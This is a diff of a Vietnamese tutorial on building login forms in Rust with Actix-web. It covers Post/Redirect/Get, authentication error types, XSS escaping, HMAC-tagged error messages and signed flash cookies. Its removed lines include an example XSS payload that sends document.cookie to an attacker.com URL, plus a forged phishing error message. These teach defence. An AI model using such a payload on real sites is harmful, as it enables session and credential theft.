@@ -1,199 +1,132 @@
 ---
-title: "10.5 - 10.6 Xử Lý Form Đăng Nhập & Phục Vụ Trang HTML"
-description: "Phục vụ giao diện HTML với Actix-web, xử lý luồng đăng nhập Post/Redirect/Get, phòng chống tấn công XSS và bảo vệ thông báo lỗi bằng HMAC Tag cùng Flash Cookies."
+title: "10.5 - 10.6 Login Forms"
+description: "Phục vụ HTML, xử lý form đăng nhập, phân loại lỗi xác thực, thử các cách truyền flash message và hoàn thiện bằng cookie có chữ ký."
 ---
 
-import { Callout } from "fumadocs-ui/components/callout";
+# 10.5 - 10.6 Login Forms
 
-# 10.5 - 10.6 Xử Lý Form Đăng Nhập & Phục Vụ Trang HTML
+Chương trước đã xây nền tảng password-based authentication cho `POST /newsletters`. Giờ ta chuyển sang tương tác với browser: phục vụ HTML, nhận form đăng nhập và đưa lỗi về đúng trang để người dùng thử lại. Các bước được trình bày theo tiến trình thử nghiệm; một số cách làm trung gian cố ý có thiếu sót và sẽ được thay thế.
 
-Basic Authentication là giải pháp tuyệt vời cho giao tiếp giữa các máy chủ (Machine-to-Machine API). Tuy nhiên, đối với tác giả blog — một con người bằng xương bằng thịt sử dụng trình duyệt web — chúng ta cần cung cấp một giao diện đăng nhập đồ họa thân thiện: một **Trang đăng nhập HTML (Login Form)**.
+## I. Phục vụ trang HTML
 
----
-
-## I. Phục Vụ Trang HTML Bằng Actix-web (Serving HTML Pages)
-
-Để hiển thị trang đăng nhập, ta tạo một endpoint `GET /login`. Handler này sẽ trả về một chuỗi mã HTML với header `Content-Type: text/html; charset=utf-8`:
-
-Tạo module `src/routes/login/get.rs`:
+Trước tiên thêm route trang chủ rỗng để xác nhận cách trả HTTP response. Handler `GET /` trả `200 OK` không có body. Sau đó tạo file `home.html` chứa trang HTML đơn giản và dùng `include_str!` để nhúng nội dung vào binary lúc compile:
 
 ```rust
-//! src/routes/login/get.rs
-use actix_web::http::header::ContentType;
-use actix_web::HttpResponse;
-
-pub async fn login_form() -> HttpResponse {
-    HttpResponse::Ok()
-        .content_type(ContentType::html())
-        .body(
-            r#"<!DOCTYPE html>
-<html lang="en">
-<head>
-    <meta http-equiv="content-type" content="text/html; charset=utf-8">
-    <title>Login</title>
-</head>
-<body>
-    <form action="/login" method="post">
-        <label>Username
-            <input
-                type="text"
-                placeholder="Enter Username"
-                name="username"
-            >
-        </label>
-        <label>Password
-            <input
-                type="password"
-                placeholder="Enter Password"
-                name="password"
-            >
-        </label>
-        <button type="submit">Login</button>
-    </form>
-</body>
-</html>"#,
-        )
+pub async fn home() -> HttpResponse {
+    HttpResponse::Ok().body(include_str!("home.html"))
 }
 ```
 
-Đăng ký route mới vào ứng dụng trong `src/startup.rs`:
+`include_str!` trả `&'static str`: nội dung file trở thành một phần của binary, nên tham chiếu tới nó có thời hạn `'static`. Mở `http://localhost:8000` sẽ thấy nội dung trang. Browser có thể cảnh báo nếu encoding không được khai báo. Nên khai báo cả trong tài liệu (để browser và crawler đọc được) lẫn HTTP header (để mọi HTTP client đều biết):
 
-```rust
-//! src/startup.rs
-use crate::routes::{login_form, publish_newsletter};
-
-// [...]
-App::new()
-    .route("/login", web::get().to(login_form))
-    // [...]
+```html
+<meta http-equiv="content-type" content="text/html; charset=utf-8">
 ```
 
----
+```rust
+use actix_web::http::header::ContentType;
 
-## II. Xử Lý Dữ Liệu Form Đăng Nhập (Processing Form Data)
+HttpResponse::Ok()
+    .content_type(ContentType::html())
+    .body(include_str!("home.html"))
+```
 
-Khi người dùng nhấn nút "Login", trình duyệt sẽ đóng gói dữ liệu hai ô input thành định dạng `application/x-www-form-urlencoded` và gửi một request `POST /login`.
+## II. Tạo form đăng nhập
 
-Chúng ta tạo struct hứng dữ liệu với `serde::Deserialize` và dùng kiểu `Secret<String>` từ crate `secrecy` để bảo vệ mật khẩu không bị in vô tình ra log:
+Tạo module `login` với handler `GET /login`, ban đầu trả response rỗng, rồi phục vụ file `login.html`. Form có hai input `username` và `password`; `type="password"` chỉ che ký tự hiển thị, không tự mã hóa dữ liệu. `label` giúp người dùng kích hoạt input và hỗ trợ screen reader. `placeholder` gợi ý nội dung, còn `name` là key dùng để nhận diện giá trị ở server.
+
+Nếu không khai báo `action` và `method`, form mặc định gửi tới chính trang hiện tại bằng `GET`. Khi thử submit, URL sẽ chứa dữ liệu như `/login?username=myusername&password=mysecretpassword`. Query string nằm trong browser history và có thể bị ghi vào log, chẳng hạn field `http.route` trong telemetry của backend; tuyệt đối không gửi password hay dữ liệu nhạy cảm theo cách này. Khai báo `action` rõ ràng cũng giúp tránh dựa vào hành vi mặc định vốn không được tài liệu hóa rõ.
+
+Khai báo rõ nơi nhận và HTTP method:
+
+```html
+<form action="/login" method="post">
+```
+
+`POST` gửi dữ liệu trong request body, với content type `application/x-www-form-urlencoded`. Tạo `POST /login`; lúc đầu route có thể trả `200` rỗng. Sau khi submit, refresh sẽ khiến browser hỏi có gửi lại form không. Pattern **Post/Redirect/Get** tránh điều đó: sau xử lý POST, trả redirect `303 See Other` cùng `Location` trỏ tới trang GET. `303` phù hợp để chuyển từ kết quả gửi form sang trang đọc thông tin.
 
 ```rust
-//! src/routes/login/post.rs
-use actix_web::{web, HttpResponse};
-use secrecy::Secret;
+HttpResponse::SeeOther()
+    .insert_header((LOCATION, "/"))
+    .finish()
+```
 
+Lúc này handler mới chỉ redirect vô điều kiện, chưa xác minh credentials.
+
+## III. Đọc form và dùng chung authentication logic
+
+Dùng `web::Form` extractor và struct `Deserialize`; password tiếp tục là `Secret<String>`:
+
+```rust
 #[derive(serde::Deserialize)]
 pub struct FormData {
     username: String,
     password: Secret<String>,
 }
 
-#[tracing::instrument(
-    skip(form, pool),
-    fields(username=tracing::field::Empty, user_id=tracing::field::Empty)
-)]
-pub async fn login(
-    form: web::Form<FormData>,
-    pool: web::Data<PgPool>,
-) -> Result<HttpResponse, InternalError<LoginError>> {
-    let credentials = Credentials {
-        username: form.0.username,
-        password: form.0.password,
-    };
-    
-    // Ghi lại username vào span (loại trừ password)
-    tracing::Span::current().record("username", &tracing::field::display(&credentials.username));
-
-    match validate_credentials(credentials, &pool).await {
-        Ok(user_id) => {
-            tracing::Span::current().record("user_id", &tracing::field::display(&user_id));
-            Ok(HttpResponse::SeeOther()
-                .insert_header((actix_web::http::header::LOCATION, "/admin/dashboard"))
-                .finish())
-        }
-        Err(e) => {
-            // Xử lý khi đăng nhập thất bại
-            // [...]
-        }
-    }
+pub async fn login(form: web::Form<FormData>) -> HttpResponse {
+    // ...
 }
 ```
 
-### Mô hình Post/Redirect/Get và Mã HTTP 303 See Other
+Luồng `POST /newsletters` có hai phần: `basic_authentication` tách credentials từ Authorization header, còn `validate_credentials` so sánh username/password với database. Login form không dùng Basic header, nhưng có thể dùng lại phần validate. Lúc này `validate_credentials` lại trả `PublishError`, vốn gắn với route newsletters. Ta tách phần dùng chung sang `authentication` module và định nghĩa `AuthError` với hai loại: credentials sai (`InvalidCredentials`) và lỗi hệ thống (`UnexpectedError`). Caller cần phân biệt để trả 401 cho lỗi xác thực và 500 cho lỗi nội bộ.
 
-Khi đăng nhập thành công, server không nên trả về trực tiếp nội dung trang Dashboard bằng mã 200 OK. Nếu làm vậy, khi người dùng nhấn F5 (Refresh) trên trình duyệt, trình duyệt sẽ cảnh báo và gửi lại request POST trước đó.
+Việc đổi error type làm `cargo check` báo hai lỗi `E0277`: `?` không thể chuyển `PublishError` thành `AuthError` bên trong verifier; và handler newsletter không thể chuyển `AuthError` thành `PublishError`. Sửa verifier để trả `AuthError` — lỗi parse PHC là unexpected, còn verify thất bại là invalid credentials. Ở route newsletter, map rõ từng biến thể sang variant tương ứng của `PublishError`. Bọc toàn bộ `AuthError` thay vì chỉ nguyên nhân bên trong để giữ context trong error chain khi logging. Sau đó chuyển `Credentials`, `validate_credentials`, `get_stored_credentials` và `verify_password_hash` sang module dùng chung; các field cần được đánh dấu `pub` nếu caller ở module khác cần truy cập.
 
-Quy chuẩn thiết kế web chuẩn mực là **Post/Redirect/Get Pattern**:
-- Sau khi xử lý request `POST` thành công, server trả về mã chuyển hướng **HTTP 303 See Other** kèm theo header `Location: /admin/dashboard`.
-- Trình duyệt tự động chuyển hướng và thực hiện một request `GET /admin/dashboard`. Giờ đây người dùng có thể thoải mái F5 mà không sợ gửi lại form đăng nhập.
+Handler login tạo `Credentials`, ghi username vào tracing span (không ghi password), rồi gọi `validate_credentials`. Trong lần thử đầu, bỏ qua lỗi sẽ khiến handler panic và Actix đóng connection, browser báo connection reset. Không để lỗi không xử lý trong handler. Tạo `LoginError`, map `AuthError` sang lỗi login và triển khai `ResponseError`: `UnexpectedError` là 500, authentication failure là 401. Mặc định `ResponseError` dùng biểu diễn `Display` làm response body; vì vậy browser hiện `Authentication failed`. Đây là phản hồi tốt hơn panic, nhưng người dùng không có form để thử lại.
 
----
+## IV. Truyền lỗi trở lại form
 
-## III. Hiển Thị Thông Báo Lỗi Ngữ Cảnh (Contextual Errors)
+### Cách ngây thơ: dựng lại HTML trong error response
 
-Khi đăng nhập thất bại, chúng ta muốn đưa người dùng quay lại trang `/login` và hiển thị một dòng thông báo màu đỏ: *"Tên đăng nhập hoặc mật khẩu không chính xác"*. 
+Có thể override `error_response` để trả lại login page và chèn đoạn `<p>` báo lỗi. Nhưng cách này tạo hai bản HTML gần giống nhau, phải cập nhật cùng lúc, và refresh vẫn có thể gửi lại POST. Tốt hơn là lỗi cũng redirect về `GET /login` để dùng lại một trang. Tuy nhiên redirect đơn thuần mất thông tin lỗi.
 
-Làm thế nào để truyền thông điệp lỗi này một cách an toàn?
+### Query parameter và XSS
 
-### 1. Hiểm họa Cross-Site Scripting (XSS) từ Query Parameters
+Ta thử truyền thông báo trong `Location: /login?error=...`, URL-encode nó và đọc bằng `web::Query`. Nếu đưa trực tiếp giá trị vào HTML, người dùng có thể sửa URL thành thông báo chứa thẻ `<a>` hoặc JavaScript; nội dung không đáng tin sẽ được browser render như HTML từ website thật. Đó là **cross-site scripting (XSS)**, có thể dùng để lừa người dùng tiết lộ credentials.
 
-Cách tiếp cận ngây thơ đầu tiên là đính kèm thông báo lỗi vào Query Parameter khi chuyển hướng:
-```text
-Location: /login?error=Invalid%20credentials
-```
+Theo hướng dẫn OWASP, khi hiển thị dữ liệu không tin cậy trong HTML phải HTML entity-encode các ký tự cấu trúc như `&`, `<`, `>`, dấu nháy kép, nháy đơn và `/`. Ví dụ sách dùng `htmlescape::encode_minimal`. Khi đó thẻ link hiện thành text, không còn được render. Nhưng escaping chưa xác thực nguồn thông điệp: kẻ tấn công vẫn có thể viết “hãy gọi số điện thoại này” hoặc nội dung lừa đảo khác. Cần đảm bảo thông báo do server tạo ra và không bị sửa.
 
-Khi trang `/login` render, nó đọc tham số `error` từ URL và in trực tiếp vào HTML:
-```html
-<p><i>{{ error }}</i></p>
-```
+### HMAC bảo vệ tính toàn vẹn
 
-<Callout type="warn" title="Lỗ hổng Cross-Site Scripting (XSS)">
-Nếu một kẻ tấn công gửi cho người dùng một đường link độc hại:
-`/login?error=<script>document.location='http://attacker.com/steal?cookie='+document.cookie</script>`
-Trình duyệt của nạn nhân sẽ tải trang, đọc chuỗi script độc hại và thực thi mã JavaScript đó ngay trên miền của bạn! Toàn bộ cookie và phiên làm việc của người dùng sẽ bị đánh cắp hoàn toàn.
-</Callout>
+Message authentication bảo đảm **integrity** và **data origin authentication**. MAC gắn tag vào thông điệp để verifier kiểm tra. HMAC là họ MAC dựa trên hash và secret key; chi tiết padding nằm trong RFC 2104. Thay vì tự cài công thức, dùng crate `hmac` với SHA-256.
 
-**Giải pháp**: Bắt buộc phải mã hóa các ký tự đặc biệt trong HTML (**HTML Escaping**) hoặc từ chối mọi chuỗi văn bản tự do truyền qua URL.
+Tạo query string canonical `error=<URL-encoded message>`, tính HMAC trên chính bytes của query string, đưa tag dạng hex vào URL. `ResponseError` không có application state nên không thể lấy HMAC secret qua extractor `web::Data`; cần chuyển phần tạo redirect về handler login, nơi secret có thể được inject. Nếu cần giữ error context cho middleware logging mà vẫn trả redirect tùy chỉnh, dùng `actix_web::error::InternalError::from_response(error, response)`.
 
-### 2. Chống giả mạo thông điệp với mã HMAC (Message Authentication Codes)
+Đưa secret vào cấu hình, giữ giá trị dưới dạng `Secret<String>`, nạp từ environment cho production. Tránh inject một `Secret<String>` chung chung vào application state vì service khác có thể đăng ký cùng kiểu; dùng newtype như `HmacSecret(Secret<String>)` để phân biệt.
 
-Kể cả khi đã escape HTML, kẻ tấn công vẫn có thể chỉnh sửa query parameter để tạo ra các thông điệp đánh lừa người dùng:
-`/login?error=He%20thong%20dang%20bao%20tri,%20vui%20long%20gui%20mat%20khau%20ve%20email%20admin@hacker.com`.
+Ở `GET /login`, `error` và `tag` phải cùng có hoặc cùng vắng mặt. Thay vì hai `Option<String>` dễ biểu diễn trạng thái chỉ có một field, khai báo cả hai field bắt buộc trong `QueryParams` rồi để chính extractor là optional: `Option<web::Query<QueryParams>>`. `verify` decode hex tag, dựng lại canonical query string và gọi `mac.verify_slice(&tag)`. Nếu xác minh thất bại, ghi warning và không render error; nếu thành công, vẫn HTML-escape trước khi đưa message vào page. HMAC chứng minh message có integrity và nguồn là bên biết secret, nhưng không mã hóa message; query string vẫn lộ qua URL và history.
 
-Để đảm bảo thông điệp lỗi thực sự do chính máy chủ của chúng ta sinh ra và **chưa hề bị can thiệp sửa đổi (tampered)**, chúng ta sử dụng thuật toán **HMAC (Hash-based Message Authentication Code)** kết hợp hàm băm SHA-256:
+Cách này bảo vệ tính toàn vẹn, nhưng query parameter vẫn ở URL, history và autocomplete. Thông báo hợp lệ có thể xuất hiện lại lâu sau lần đăng nhập lỗi. Ta muốn message **ephemeral**: hiện một lần sau redirect rồi biến mất. Cookie phù hợp hơn query parameter.
 
-```text
-/login?error=Invalid%20credentials&tag=5a7f9b8c2d...
-```
+## V. Cookie và flash messages
 
-- Server nắm giữ một bí mật chung (**Secret Key**).
-- Khi tạo chuyển hướng lỗi, server tính mã tag: `tag = HMAC_SHA256(error_message, secret_key)`.
-- Khi trang `/login` nhận request, nó tính lại mã tag từ `error` và so sánh với `tag` trên URL. Nếu không khớp, server biết ngay thông điệp đã bị kẻ xấu chỉnh sửa và từ chối hiển thị!
+Cookie là dữ liệu nhỏ server gửi bằng `Set-Cookie`; browser lưu rồi gửi lại trong các request sau. Luồng flash message thủ công: POST thất bại đặt cookie chứa message rồi redirect; GET đọc và render message; GET xóa cookie. URL không đổi và cookie được “tiêu thụ” sau khi hiển thị. Thông báo dùng một lần kiểu này gọi là **flash message**.
 
----
+### Test redirect và cookie
 
-## IV. Thông Báo Lỗi Phải Có Tính Chớp Nhoáng (Flash Messages)
+Thêm integration test cho login lỗi. `reqwest::Client` tự động theo redirect (tối đa 10 hop), vì vậy test nhận 200 từ trang đích thay vì 303. Tạo client với `redirect::Policy::none()` để kiểm tra trực tiếp response. Helper `assert_is_redirect_to` xác nhận status 303 và `Location`.
 
-Ngay cả khi dùng HMAC, giải pháp qua URL vẫn còn một nhược điểm khó chịu:
-Nếu người dùng đăng nhập sai, thấy thông báo lỗi, rồi sau đó F5 lại trang `/login`, thông báo lỗi đó **vẫn tiếp tục hiển thị mãi mãi** vì tham số `?error=...` vẫn nằm nguyên trên thanh địa chỉ!
+Ban đầu test phát hiện `Location` vẫn chứa `error` và `tag`, nên bỏ phần query/HMAC khỏi handler. Kế tiếp kiểm tra `Set-Cookie`. Header này có thể lặp nhiều lần; có thể dùng `get_all`, nhưng bật feature `cookies` của reqwest cho phép dùng `response.cookies()`. Cookie test nên quan sát hành vi công khai, không phụ thuộc cách framework mã hóa storage.
 
-Thông báo lỗi đăng nhập phải là một **Thông báo chớp nhoáng (Ephemeral / Flash Message)**: *Nó chỉ được hiển thị đúng một lần duy nhất, và biến mất ngay lập tức ở lần tải trang tiếp theo*.
+Trong Actix có thể set cookie bằng header thô hoặc API riêng `Cookie::new`. API cookie rõ nghĩa hơn. Để kiểm tra browser flow, dùng cùng một `reqwest::Client` với `.cookie_store(true)` cho mọi request trong `TestApp`; nếu mỗi helper tạo client riêng, cookie không được chuyển từ POST sang GET.
 
-### Cơ chế hoạt động của HTTP Cookies
+### Đọc và xóa cookie thủ công
 
-Để làm được điều này, chúng ta sử dụng **Cookie**:
+`GET /login` nhận `HttpRequest`, gọi `request.cookie("_flash")`, rồi render giá trị nếu có. Test giờ có thể đi theo redirect (dùng request GET) và xác nhận HTML có `<p><i>Authentication failed</i></p>`.
 
-```text
-[POST /login] ──► Server trả về: Set-Cookie: _flash=Invalid%20credentials; HttpOnly; SameSite=Lax
-                      │
-[GET /login]  ◄── Trình duyệt gửi: Cookie: _flash=Invalid%20credentials
-                      │
-              Server render thông báo lỗi và gửi kèm:
-              Set-Cookie: _flash=; Max-Age=0 (Xóa cookie ngay lập tức!)
-```
+Cookie chưa tự biến mất: refresh hoặc mở tab mới vẫn hiện message cũ. Không có `Unset-Cookie`; thay vào đó trả `Set-Cookie` cùng tên với `Max-Age=0`, khiến browser hết hạn cookie ngay. `HttpResponseBuilder::add_removal_cookie` biểu đạt mục đích rõ hơn việc tự đặt tuổi thọ bằng zero.
 
-Các thuộc tính bảo mật bắt buộc của Cookie:
-- **`HttpOnly`**: Ngăn chặn tuyệt đối các đoạn mã JavaScript chạy trên trình duyệt truy cập vào cookie qua `document.cookie` (vô hiệu hóa triệt để đánh cắp session qua XSS).
-- **`SameSite=Lax` / `Strict`**: Ngăn trình duyệt tự động gửi cookie trong các request bắt nguồn từ trang web bên ngoài, triệt tiêu tấn công **CSRF (Cross-Site Request Forgery)**.
-- **`Secure`**: Chỉ gửi cookie qua các kết nối được mã hóa TLS (HTTPS).
+### Bảo vệ cookie
 
-Trong thực tế, thay vì quản lý vòng đời cookie thủ công, chúng ta sử dụng crate chuyên dụng [`actix-web-flash-messages`](https://crates.io/crates/actix-web-flash-messages) tích hợp cùng Actix-web để tự động hóa toàn bộ quy trình ký HMAC và xóa cookie chớp nhoáng sau khi hiển thị.
+Cookie qua HTTP không mã hóa có thể bị đọc hoặc sửa bởi man-in-the-middle; API phải dùng HTTPS, và đặt thuộc tính `Secure` để browser chỉ gửi cookie trên kết nối bảo mật. Mặc định dùng `HttpOnly` để JavaScript không đọc cookie. Tuy vậy, HttpOnly không phải thuốc chữa mọi XSS và không ngăn mọi khả năng ghi đè cookie. Người dùng cũng có thể sửa cookie bằng developer tools. Cookie mang dữ liệu cần integrity nên phải được ký; HMAC tag trên cookie thường được gọi là **signed cookie**.
+
+### `actix-web-flash-messages`
+
+Thay vì tự quản lý chữ ký, thuộc tính cookie và việc xóa, sách dùng crate `actix-web-flash-messages` (tác giả crate cũng chính là tác giả sách). Bật feature `cookies`, tạo `CookieMessageStore` bằng `Key` từ HMAC secret, rồi đăng ký `FlashMessagesFramework` middleware. `FlashMessage::error(...).send()` gửi thông báo; framework ký cookie và xử lý lưu trữ. `GET /login` nhận `IncomingFlashMessages`, lọc theo `Level::Error`, render từng message và không cần tự đọc/xóa cookie. Framework xác minh chữ ký trước khi handler chạy.
+
+Test ban đầu fail vì so sánh trực tiếp giá trị cookie đã encode/ký với chuỗi message. Assertion đang khóa vào chi tiết triển khai. Sửa test để xác nhận hành vi: POST lỗi redirect về `/login`, lần GET đầu có thông báo lỗi, GET kế tiếp không còn thông báo. Như vậy test chứng minh flash message dùng một lần mà không phụ thuộc định dạng cookie.
+
+## VI. Nguồn tiếp theo
+
+Phần sau dùng flash messages cho login, rồi xây session-based authentication. Session giải quyết việc không buộc người dùng gửi password ở mọi request; cookie session cần được bảo vệ vì token hợp lệ có quyền tương đương credentials.
